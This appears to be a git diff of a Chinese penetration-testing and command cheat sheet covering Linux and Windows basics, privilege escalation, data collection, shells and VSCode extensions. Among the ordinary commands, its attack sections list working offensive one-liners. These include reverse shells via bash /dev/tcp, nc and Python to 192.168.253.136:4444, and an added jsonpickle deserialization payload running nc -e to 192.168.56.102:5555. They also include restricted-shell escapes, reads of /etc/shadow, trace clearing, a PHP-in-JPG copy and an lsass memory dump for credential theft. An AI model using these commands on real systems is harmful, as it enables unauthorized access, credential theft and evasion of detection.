@@ -21,6 +21,7 @@
 ```
 cd                      //切换目录 [-进入前一目录]
 ls                      //显示当前目录下内容 [-l详细信息,-a所有文件]
+tree                    //树形结构
 pwd                     //查看当前所处目录
 touch file              //创建空文件
 mkdir file              //创建空目录 [-p建立多级目录]
@@ -28,13 +29,13 @@ rm                      //删除文件或目录 [-f强制删除-r递归处理]
 cp a b                  //复制文件或目录 [-a保留链接、文件属性及目录下的所有内容]
 scp a b                 //远程拷贝文件(a到:b) [-C使用压缩-P指定远程端口-r以递归方式复制]
 mv a b                  //移动文件或目录(还可以重命名)
-cat file                //查看文本文件内容
-less file               //分页显示文本文件内容,前后翻看
+cat                     //查看文本文件内容
+less                    //分页显示文本文件内容,前后翻看
 diff a b                //比较两个文件的差异
-whereis file            //在资料库中查找
-find file               //按条件查询指定文件
+whereis                 //在资料库中查找
+find                    //按条件查询指定文件
 locate                  //查找文件或目录
-grep                    //筛选符合条件的内容
+grep                    //筛选符合条件的内容 [-ABC前后-e或-i忽略大小写-n行号-o精确-v反向]
 alias                   //设置指令的别名 [-p打印已设置]
 uname                   //查看当前系统相关信息 [-a全部信息]
 lsb_release             //查看当前系统的发行版信息 [-a全部信息]
@@ -44,7 +45,8 @@ sudo                    //以系统管理者身份执行指令
 chmod                   //变更文件或目录的权限
 env                     //显示系统环境变量 [-u从当前环境中删除指定的变量]
 echo                    //打印输出
-wget                    //从指定的URL下载文件
+curl                    //利用URL规则工作的文件传输工具 [-d·POST数据-H自定义头-k忽略警告-X请求方式]
+wget                    //从指定的URL下载文件 [-r递归-l深度]
 clear                   //清屏
 ifconfig                //显示或设置网络设备
 netstat                 //显示网络状态 [-pantu]
@@ -100,8 +102,6 @@ git -p help 然后 !/bin/sh或!/bin/bash
 zip /tmp/test.zip /tmp/test -T --unzip-command="sh -c /bin/bash"
 tar cf /dev/null testfile --checkpoint=1 --checkpointaction=exec=/bin/bash
 -------------------------------------------------------
-BASH_CMDS[a]=/bin/sh;a
-/bin/bash
 export PATH=$PATH:/bin/     #将/bin导出到PATH环境变量
 export PATH=$PATH:/usr/bin  #将/usr/bin目录导出到PATH环境变量
 ```
@@ -109,9 +109,10 @@ export PATH=$PATH:/usr/bin  #将/usr/bin目录导出到PATH环境变量
 ### 数据收集
 
 ```
-/etc/crontab
 /etc/passwd
 /etc/shadow
+/etc/crontab
+/etc/nginx/sites-available/default
 ```
 
 ### 清理痕迹
@@ -128,6 +129,7 @@ history -cw
 ### 基本命令
 
 ```
+cd                                         //改变或显示当前目录 [/d]
 dir                                        //显示当前目录下内容
 ren                                        //文件或目录重命名
 type                                       //查看文本文件内容
@@ -160,12 +162,13 @@ reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLo
 rundll32 user32.dll,LockWorkStation                         #强制锁屏,使其重新登录
 procdump.exe -accepteula -ma lsass.exe lsass.dmp            #导出内存文件lsass.dmp
 ```
-
+  
 ## Control
 
-### Bash
+### Sundry
 
 ```
+copy /a a.php + /b b.jpg = c.jpg
 bash -c 'sh -i &>/dev/tcp/192.168.253.136/4444 0>&1'
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.253.136 4444 >/tmp/f
 ```
@@ -175,6 +178,7 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.253.136 4444 >/tmp
 ```
 python -c 'import pty; pty.spawn("/bin/bash")'
 __import__('os').system('nc -e /bin/bash 192.168.253.136 4444')
+{"py/object":"__main__.Shell","py/reduce":[{"py/function":"os.system"},["nc -e /bin/sh 192.168.56.102 5555"], 0, 0, 0]}
 ```
 
 ### PHP
@@ -244,22 +248,23 @@ git merge name                  //将某个分支合并到当前分支下
 ### VSCode
 
 ```
-Chinese (Simplified) ...         //VSCode的中文(简体)语言包
+Chinese (Simplified) ...         //中文(简体)语言包
+ESLint                           //语法检查
 Code Runner                      //代码运行器
-Comment Translate                //翻译
-Debugger for Chrome              //Chrome调试器
-Easy LESS                        //简单的LESS
-GitLens—Git supercharged         //增强内置的Git功能
-jQuery Code Snippets             //jQuery代码片段
-Live Server                      //启动实时加载服务器
-open in browser                  //在浏览器中打开
-Path Intellisense                //路径感知
+GitLens—Git supercharged         //增强Git功能
 Visual Studio IntelliCode        //智能代码
+Debugger for Chrome              //Chrome调试器
+open in browser                  //在浏览器中打开
+Live Server                      //启动服务器
 Code Spell Checker               //代码拼写检查
-Prettier-Code formatter          //代码格式化
-JavaScript (ES6) code snippets   //ES6代码片段
 Quokka.js                        //即时反馈
+Prettier-Code formatter          //代码格式化
+Path Intellisense                //路径感知
+Easy LESS                        //less编译为css
+jQuery Code Snippets             //jQuery代码片段
+JavaScript (ES6) code snippets   //ES6代码片段
 Vetur                            //Vue工具
 Vue 2 Snippets                   //Vue2代码片段
-ESLint                           //语法检查
+Comment Translate                //划词翻译
+Python                           //Python集成
 ```
